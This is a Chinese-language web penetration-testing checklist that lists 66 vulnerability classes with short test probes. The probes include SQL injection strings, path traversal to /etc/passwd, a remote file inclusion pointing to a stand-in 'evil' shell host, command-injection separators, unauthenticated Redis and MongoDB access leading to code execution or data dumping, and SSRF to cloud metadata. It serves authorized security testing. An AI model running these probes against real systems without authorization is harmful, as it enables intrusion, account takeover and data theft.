# 漏洞覆盖总目录（vuln-catalog）

> 来源：jiejieskill 漏洞覆盖下限清单（2026-08-13 整合）。
> **定位**：这是全流程测试的「漏洞覆盖下限清单」——7 大类 66 项，逐项必测，禁止漏项。
> **用法**：`checklist.md` 第 3 节按本目录逐项打勾；每项「深挖」指向对应 reference 文件取命令。
> **原则**：本目录是下限不是上限，技术栈命中即优先测，清单外攻击面同样测并沉淀回本文件。

---

## 1. 认证和授权类（14 项）

| # | 漏洞 | 测试要点 | 深挖 |
|---|------|---------|------|
| 1.1 | 弱口令 | 全入口（Web 后台/服务/中间件/数据库）跑弱口令字典；⚠️先确认真实账号再爆破，别拿猜测账号（admin/0001）测出「账号不存在」就误判无弱口令；登录框有 SQLi 时 `' or '1'='1`+密码P=弱口令探针 | `weakpass-check.md` |
| 1.2 | 密码明文传输 | 抓包看登录/注册/改密是否 HTTP 明文、是否前端可逆加密（非 HTTPS） | `web-vulns.md` |
| 1.3 | 用户名可枚举 | 登录/注册/找回接口响应差异（状态码/长度/文案/时延）判断用户是否存在 | `auth-testing.md` |
| 1.4 | 暴力破解 | 无次数限制/无验证码的登录口跑字典；密码喷射避免锁定 | `password-cracking.md` |
| 1.5 | 会话标识未更新 | 登录前后 session/cookie 是否变化（会话固定）；改密后旧 token 是否失效 | `auth-testing.md` |
| 1.6 | 未授权访问 | 不认证直接访问后台/API/管理端点 | `middleware-unath.md` §6.11 |
| 1.7 | 文件上传漏洞 | 后缀/内容类型/文件头/解析绕过 → getshell | `input-upload-js.md` |
| 1.8 | 任意文件下载 | 下载参数路径穿越 `../../etc/passwd`、任意文件读取 | `input-upload-js.md` |
| 1.9 | 越权 | IDOR/BOLA/BFLA：改 ID/角色/方法访问他人数据或管理功能 | `web-vulns.md` §6.2 |
| 1.10 | 失效的身份认证 | token 失效/重放、MFA 绕过、认证逻辑缺陷 | `auth-testing.md` |
| 1.11 | Redis 未授权访问 | 6379 无认证 `redis-cli -h ip info` → 写计划任务/SSH key RCE | `middleware-unath.md` §6.11 |
| 1.12 | MongoDB 未授权访问 | 27017 无认证 `mongo ip --eval 'db.getCollectionNames()'` 拖库 | `middleware-unath.md` §6.11 |
| 1.13 | Hadoop 未授权访问 | YARN 8088 `/cluster` 未认证 → 提交任务 RCE | `middleware-unath.md` §6.11 |
| 1.14 | Elasticsearch 未授权访问 | 9200 `/_cat/indices` 未认证 → 数据泄露/集群接管 | `middleware-unath.md` §6.11 |

---

## 2. 命令执行 / 反序列化类（8 项）

| # | 漏洞 | 测试要点 | 深挖 |
|---|------|---------|------|
| 2.1 | Struts2 远程命令执行 | 指纹 Struts2 → S2-045/057/062/066 探测 RCE | `middleware-unath.md` §6.10 |
| 2.2 | JBoss 远程代码执行 | `/invoker/JMXInvokerServlet` 反序列化、`/admin-console` 弱口令部署 | `middleware-unath.md` §6.10 |
| 2.3 | HTTP.sys 远程代码执行 | IIS + HTTP.sys（CVE-2015-1635）：畸形 Range 头 → 蓝屏/内核读。nuclei `-t cves/` 或 msf | `cve-scanning.md` |
| 2.4 | Shiro 反序列化 | rememberMe cookie → 无效 cookie 响应含 deleteMe → AES key 爆破 → CC 链 RCE | `middleware-unath.md` §6.10 |
| 2.5 | H3C IMC 代码执行 | 指纹 H3C iMC 智能管理中心 → CVE-2017-7803 / 前台文件上传 → RCE | `cve-scanning.md` |
| 2.6 | 用友 NC 命令执行 | 指纹用友 NC/GRP → 对应 RCE/SQLi exp | `middleware-unath.md` §6.10 |
| 2.7 | GitLab 命令执行 | CVE-2021-22205（ExifTool RCE，图片上传）、CVE-2022-2185 等 | `cve-scanning.md` |
| 2.8 | 文件包含 | LFI：`?file=../../etc/passwd`、`php://filter`、日志/session 包含；RFI：`?file=http://evil/shell` | `web-vulns.md` §6.2 |

---

## 3. 业务逻辑类（16 项）

> 短信类测试统一用测试号 **<测试手机号>**（自行填写），轰炸控制在少量次数内。

| # | 漏洞 | 测试要点 | 深挖 |
|---|------|---------|------|
| 3.1 | 验证码功能缺陷 | 图形验证码：删除参数/OCR/复用/前端校验绕过/错误不刷新 | `auth-testing.md` |
| 3.2 | 并发漏洞 | 竞态 TOCTOU：并发提交转账/提现/领券（Turbo Intruder 多线程） | `web-vulns.md` §6.2 |
| 3.3 | 并发登录 | 同账号多设备并发登录：是否互踢/告警/限制；会话互踢逻辑缺陷 → 会话复用 | `auth-testing.md` |
| 3.4 | 短信炸弹 | 发送接口无次数/间隔限制 → 同号无限触发（云成本 DoS） | `auth-testing.md` |
| 3.5 | 短信定向转发 | 收件人参数（receiver/mobile）可控 → 验证码/通知发到攻击者手机号 | `auth-testing.md` |
| 3.6 | 邮件炸弹 | 邮件发送接口无限次 → 骚扰/资源耗尽 | `auth-testing.md` |
| 3.7 | 邮件定向转发 | 收件人参数（email/to）可控 → 重置链接/验证码发到自己邮箱 | `auth-testing.md` |
| 3.8 | 任意密码重置/修改 | 不校验原密码、user_id 篡改改他人密码、重置 token 可预测/回显；⚠️弱认证要素爆破（身份证后4码+生日等小搜索空间 + 无锁定 = 可爆破任意员工密码） | `auth-testing.md` |
| 3.9 | 恶意锁定 | 错误次数锁定机制被滥用：枚举辅助 / 锁死他人账号 DoS | `auth-testing.md` |
| 3.10 | 负值反冲 | 金额/数量改负数：`amount=-100`、`quantity=-1` 反向入账 | `web-vulns.md` §6.2 |
| 3.11 | 正负值对冲 | 两账号/两笔交易正负抵消 → 绕过余额校验套现 | `web-vulns.md` §6.2 |
| 3.12 | 业务流程跳跃 | 跳过支付/验证码步骤直达敏感操作（改 URL/改流程状态参数） | `auth-testing.md` |
| 3.13 | 恶意注册 | 绕过邀请码/批量注册灌库/注册参数带 role=admin 提权 | `auth-testing.md` |
| 3.14 | 任意短信内容发送 | 短信 content 参数可控 → 伪造官方短信（钓鱼/诈骗）发任意号码 | `auth-testing.md` |
| 3.15 | 交互式验证码绕过 | 验证码校验在 JS/前端 → 改响应重放跳过；万能验证码 000000/123456 | `auth-testing.md` |
| 3.16 | WAF 绕过 | 识别 WAF 类型 → 大小写/注释/编码/HPP/分块传输组合绕过 | `web-vulns.md` §6.9 |

---

## 4. 注入攻击类（6 项）

| # | 漏洞 | 测试要点 | 深挖 |
|---|------|---------|------|
| 4.1 | SQL 注入 | 引号破坏/注释闭合/OR 恒真/UNION/时间盲注；搜索框与参数均测；⚠️先判 DB 类型（MSSQL `TOP 1` vs MySQL `LIMIT`）再选函数；登录框 SQLi 专项（认证绕过+弱口令探针+盲注拖密码表）见 auth-testing | `web-vulns.md` §6.2 |
| 4.2 | XML 实体注入 | XXE：DOCTYPE 定义实体读文件/OOB dnslog（XML/上传/SOAP 接口） | `web-advanced-vulns.md` §3 |
| 4.3 | CRLF 注入 | 参数值加 `%0d%0a` → 注入响应头（Set-Cookie/X-XSS-Protection）、日志注入、响应拆分 | `web-vulns.md` §6.2 |
| 4.4 | XPATH 注入 | XML 查询参数注入 XPath：`' or '1'='1`、`' or 1=1`、`\|` → 绕过认证/信息泄露 | `web-vulns.md` §6.2 |
| 4.5 | 命令注入 | `; \| \` $( ) && \|\| \n` 分隔符 + 时间盲注/OAST 检测 | `web-advanced-vulns.md` §2 |
| 4.6 | 链接注入/框架注入 | 参数值拼进 iframe/frame src → 引入外部页面（钓鱼/点击劫持） | `web-vulns.md` §6.2 |

---

## 5. 客户端攻击类（3 项）

| # | 漏洞 | 测试要点 | 深挖 |
|---|------|---------|------|
| 5.1 | 跨站脚本 XSS | 反射/存储/DOM：`<script>`、`<img onerror>`、value/事件属性回显；含搜索框回显 | `web-vulns.md` §6.2 |
| 5.2 | 跨站请求伪造 CSRF | 状态改变操作（改密/转账/关注）无 token/Referer/SameSite 校验 → 构造恶意页诱导点击 | `web-vulns.md` §6.2 |
| 5.3 | 不安全的 HTTP 方法 | OPTIONS 看 Allow 头；PUT 写文件、DELETE 删资源、TRACE（XST）、WebDAV | `web-vulns.md` §6.2 |

---

## 6. 信息泄漏类（12 项）

| # | 漏洞 | 测试要点 | 深挖 |
|---|------|---------|------|
| 6.1 | 目录浏览 | `/uploads/ /images/ /backup/` 无 index 直接列出文件列表 | `web-vulns.md` §6.2 |
| 6.2 | 图片遍历 | 图片/附件 ID 可枚举 → 遍历他人头像/证件：`/avatar/1.jpg → 2.jpg` | `web-vulns.md` §6.2 |
| 6.3 | 后台地址暴露 | 后台路径从前端 JS/robots/常见路径猜出：`/admin /manage /system` | `recon.md` |
| 6.4 | Web 服务器控制台地址暴露 | 管理入口暴露：`/manager/html /console /actuator` | `middleware-unath.md` §6.10 |
| 6.5 | PHPInfo 信息泄漏 | `/phpinfo.php /info.php /test.php` 泄露绝对路径/版本/扩展；⚠️必查 `disable_functions` 空=危险函数全可用（拿到代码执行即 RCE）+ `SERVER_ADDR` 内网 IP + `DOCUMENT_ROOT` 路径 | `web-vulns.md` §6.2 |
| 6.6 | .SVN 信息泄露 | `/.svn/entries / .git/config` 泄露源码路径/结构 | `web-vulns.md` §6.2 |
| 6.7 | 备份文件泄漏 | `index.php.bak / .old / .swp / www.zip / .tar.gz`；.git 泄露用 Githack | `web-vulns.md` §6.2 |
| 6.8 | 内网 IP 地址泄漏 | 响应/JS/报错/重定向（Location）泄露 10.x/192.168 内网 IP、主机名 | `web-vulns.md` §6.2 |
| 6.9 | Cookie 信息泄露 | Secure/HttpOnly/SameSite 缺失；明文/可解码敏感信息；泄露内部标识 | `auth-testing.md` |
| 6.10 | 敏感信息泄露 | 报错堆栈/注释/源码/响应头/调试信息泄露密钥/路径/账号 | `input-upload-js.md` |
| 6.11 | IIS 短文件名泄露 | 8.3 短文件名枚举：iis_shortname_Scanner 猜解后台文件 | `middleware-unath.md` §6.10 |
| 6.12 | Robots 文件信息泄露 | `/robots.txt` 列出 Disallow 敏感目录/后台路径 | `recon.md` |

---

## 7. 其他（7 项）

| # | 漏洞 | 测试要点 | 深挖 |
|---|------|---------|------|
| 7.1 | 已知漏洞组件 | 指纹/版本 → nuclei/searchsploit 命中已知 CVE（五层框架） | `cve-scanning.md` |
| 7.2 | URL 重定向 | `?redirect=//evil`、`?url=` 开放重定向 → 钓鱼/窃取 token | `web-advanced-vulns.md` §8 |
| 7.3 | DNS 域传送漏洞 | `dig axfr @ns target.com` → 拉全量 DNS 记录 | `recon.md` |
| 7.4 | Web 服务器多余端口开放 | nmap 全端口 → 意外开放的管理/调试端口 | `recon.md` |
| 7.5 | HTTP Host 头攻击 | Host 头注入 → 密码重置投毒/缓存投毒 | `web-advanced-vulns.md` §6 |
| 7.6 | 服务端请求伪造 SSRF | URL 参数/回调 → 打云元数据 169.254.169.254、内网探测、gopher | `web-vulns.md` §6.2 |
| 7.7 | Web 服务器解析漏洞 | Nginx/Apache/IIS 后缀截断、`.php.jpg`、`1.asp;.jpg` 解析执行 | `middleware-unath.md` §6.10 |

---

## 8. 专项 / 高级补充方向（skill 原有覆盖 + 清单外，与 1-7 类同等必测）

> 这些是 skill 原有专项 + 清单外高级方向，命中技术栈即优先测（深挖见各 reference）。与 1-7 类合起来共 **78 项全量覆盖**，逐项必测。

| 方向 | 触发场景 | 深挖 |
|------|---------|------|
| 加解密 / 国密 | SM2/SM3/SM4、AES/DES/RSA/JWT 加解密攻击（GmSSL/openssl、cyberchef、jwt_tool；jadx/Frida 逆向找硬编码密钥） | 本章内 |
| OAuth / OIDC | redirect_uri 篡改/state 缺失/scope 提权/token 窃取 | `auth-testing.md` |
| WebSocket | 鉴权缺失/越权订阅/消息注入/CSWSH | `auth-testing.md` |
| API Top10 | BOLA/BFLA/未限流/影子 API | `web-vulns.md` |
| SSTI 模板注入 | Jinja2/Twig/FreeMarker 渲染用户输入 `{{7*7}}` | `web-advanced-vulns.md` §1 |
| CORS 配置错误 | Origin 反射 + Access-Control-Allow-Credentials | `web-advanced-vulns.md` §4 |
| 子域接管 | CNAME 指向已释放服务（GitHub Pages/S3） | `web-advanced-vulns.md` §5 |
| Host 头缓存投毒 | Host 头影响缓存键 → 投毒 | `web-advanced-vulns.md` §7 |
| Mass Assignment | 改包加 `role=admin`/`is_admin=1` 批量赋值 | `web-advanced-vulns.md` §9 |
| JWT 攻击 | alg=none/RS256→HS256/kid 注入/k 爆破 | `web-advanced-vulns.md` §10 |
| HTTP 请求走私 | CL.TE/TE.CL 前端代理差异 | `web-advanced-vulns.md` §11 |
| NoSQL 注入 | `$ne/$gt/$where` 操作符注入 | `web-advanced-vulns.md` §12 |

---

> ⚠️ 全部测试在授权范围内进行；测试号 <测试手机号>；短信/邮件轰炸类控制次数避免真实影响。
